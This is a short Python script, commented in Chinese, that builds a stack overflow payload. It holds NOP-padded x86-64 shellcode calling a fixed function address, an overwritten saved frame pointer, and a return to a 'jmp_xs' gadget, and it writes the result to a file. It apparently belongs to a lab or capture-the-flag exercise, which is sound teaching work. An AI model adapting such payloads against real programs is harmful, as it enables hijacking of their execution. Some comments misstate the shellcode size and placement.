import struct

p64 = lambda x: struct. pack('<Q', x)

jmp_xs = 0x401334

# Shellcode
shellcode = b"\x48\x83\xe4\xf0"       # and rsp, -0x10
shellcode += b"\xbf\x72\x00\x00\x00"  # mov edi, 0x72
shellcode += b"\x48\xb8" + p64(0x401216)  # movabs rax, func1
shellcode += b"\xff\xd0"               # call rax
# shellcode = 19 bytes

# 布局：让 shellcode 在返回后的栈位置
# buffer(32) + saved_rbp(8) + ret_addr(8) + shellcode
payload = shellcode. ljust(32, b"\x90")  # NOP 填充到 32 字节
payload += b"B" * 8                      # saved rbp
payload += p64(jmp_xs)                   # 返回到 jmp_xs

with open("test3.txt", "wb") as f:
    f.write(payload)

print(f"[+] Testing jmp_xs with shellcode in buffer")
